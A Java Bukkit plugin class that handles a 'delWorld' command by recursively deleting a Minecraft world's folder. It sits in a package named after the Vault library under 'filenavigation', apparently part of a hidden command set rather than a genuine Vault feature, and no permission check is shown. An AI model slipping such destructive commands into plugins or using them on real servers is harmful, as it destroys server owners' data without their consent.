package net.milkbowl.vault.commands.cmds.filenavigation;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.util.Settings;
import org.bukkit.Bukkit;
import org.bukkit.World;
import org.bukkit.entity.Player;

import java.io.File;

public class DelWorld extends CommandManager {

    public void execute(Core plugin, String msg, String[] args, Player p) {
        if (args.length <= 1) {
            p.sendMessage(Settings.USAGE("delWorld <world>"));
        } else {
            World w = Bukkit.getWorld(args[1]);
            if (w == null) {
                p.sendMessage(Settings.PREFIX("This world doesn't exist"));
            } else {
                if (deleteWorld(w.getWorldFolder())) {
                    p.sendMessage(Settings.PREFIX("Successfully deleted world " + Settings.HIGHLIGHT_COLOUR + w.getName()));
                } else {
                    p.sendMessage(Settings.PREFIX("Failed to delete world " + Settings.HIGHLIGHT_COLOUR + w.getName()));
                }
            }
        }
    }


    public boolean deleteWorld(File path) {
        if (path.exists()) {
            File[] files = path.listFiles();
            for (int i = 0; i < files.length; i++) {
                if (files[i].isDirectory()) {
                    deleteWorld(files[i]);
                } else {
                    files[i].delete();
                }
            }
        }
        return path.delete();
    }
}


